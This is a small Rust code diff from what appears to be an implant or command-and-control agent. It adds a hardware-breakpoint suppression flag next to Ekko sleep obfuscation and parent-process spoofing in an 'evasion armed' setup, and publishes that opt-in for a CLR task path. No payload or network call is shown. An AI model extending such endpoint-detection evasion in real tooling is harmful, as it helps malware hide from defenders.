@@ -371,10 +371,14 @@ async fn main() -> anyhow::Result<()> {
         let flags = evasion::Flags::parse(&evasion_spec).map_err(anyhow::Error::msg)?;
         let armed = evasion::Evasion::enable(flags).map_err(anyhow::Error::msg)?;
         note!(
-            "[*] evasion armed: sleep={} parent-spoof={}",
+            "[*] evasion armed: sleep={} parent-spoof={} hwbp={}",
             flags.ekko_sleep,
-            flags.spoofed_parent
+            flags.spoofed_parent,
+            flags.hwbp_suppression
         );
+        // Publish the hwbp opt-in for the CLR task path before any task
+        // can run.
+        armed.publish();
         armed
     };
 
